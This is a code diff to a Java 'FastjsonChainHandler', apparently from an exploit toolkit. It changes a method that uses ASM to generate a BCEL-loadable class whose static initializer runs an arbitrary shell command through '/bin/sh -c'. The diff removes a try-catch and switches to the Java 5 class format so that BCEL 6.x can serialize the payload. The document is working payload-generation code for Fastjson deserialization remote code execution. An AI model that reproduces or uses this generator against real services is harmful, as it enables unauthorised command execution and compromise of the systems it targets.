@@ -80,29 +80,24 @@ public class FastjsonChainHandler implements ChainHandler {
     }
 
     /**
-     * Generate the simplest possible class for BCEL loading: no package, only static init.
-     * Complex class structures cause BCEL 6.x JavaClass.getBytes() to throw UnsupportedOperationException.
-     * Using ASM directly produces a clean Java 8 class that BCEL can re-serialize without issues.
+     * Generate minimal BCEL-compatible class: Java 5 (V1_5=49) with no try-catch.
+     * BCEL 6.x cannot serialize StackMapTable (required for Java 6+ try-catch blocks),
+     * throwing UnsupportedOperationException in JavaClass.getBytes().
+     * Java 5 classes have no StackMapTable → BCEL can re-serialize them cleanly.
+     * exec() declares IOException but the JVM doesn't enforce checked exception rules
+     * in raw bytecode, so no try-catch is needed at the bytecode level.
      */
     private byte[] generateBcelExecClass(String cmd) throws Exception {
-        // Use ASM (bundled with Spring Boot) to generate minimal class bytecode
-        // avoids Javassist re-serialization issues with BCEL 6.x
         org.objectweb.asm.ClassWriter cw = new org.objectweb.asm.ClassWriter(0);
         String cls = "BcelExec" + Long.toHexString(System.nanoTime());
-        cw.visit(org.objectweb.asm.Opcodes.V1_8,
+        // V1_5 (49) = Java 5 class format — no StackMapTable needed
+        cw.visit(org.objectweb.asm.Opcodes.V1_5,
             org.objectweb.asm.Opcodes.ACC_PUBLIC,
             cls, null, "java/lang/Object", null);
-        // static initializer: Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd})
         org.objectweb.asm.MethodVisitor mv = cw.visitMethod(
             org.objectweb.asm.Opcodes.ACC_STATIC, "<clinit>", "()V", null, null);
         mv.visitCode();
-        // try { Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd}); } catch(Exception e){}
-        org.objectweb.asm.Label tryStart = new org.objectweb.asm.Label();
-        org.objectweb.asm.Label tryEnd = new org.objectweb.asm.Label();
-        org.objectweb.asm.Label catchStart = new org.objectweb.asm.Label();
-        mv.visitTryCatchBlock(tryStart, tryEnd, catchStart, "java/lang/Exception");
-        mv.visitLabel(tryStart);
-        // new String[]{ "/bin/sh", "-c", cmd }
+        // Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd}) — no try-catch
         mv.visitMethodInsn(org.objectweb.asm.Opcodes.INVOKESTATIC,
             "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
         mv.visitInsn(org.objectweb.asm.Opcodes.ICONST_3);
@@ -122,12 +117,6 @@ public class FastjsonChainHandler implements ChainHandler {
         mv.visitMethodInsn(org.objectweb.asm.Opcodes.INVOKEVIRTUAL,
             "java/lang/Runtime", "exec", "([Ljava/lang/String;)Ljava/lang/Process;", false);
         mv.visitInsn(org.objectweb.asm.Opcodes.POP);
-        mv.visitLabel(tryEnd);
-        org.objectweb.asm.Label afterCatch = new org.objectweb.asm.Label();
-        mv.visitJumpInsn(org.objectweb.asm.Opcodes.GOTO, afterCatch);
-        mv.visitLabel(catchStart);
-        mv.visitInsn(org.objectweb.asm.Opcodes.POP);
-        mv.visitLabel(afterCatch);
         mv.visitInsn(org.objectweb.asm.Opcodes.RETURN);
         mv.visitMaxs(4, 0);
         mv.visitEnd();
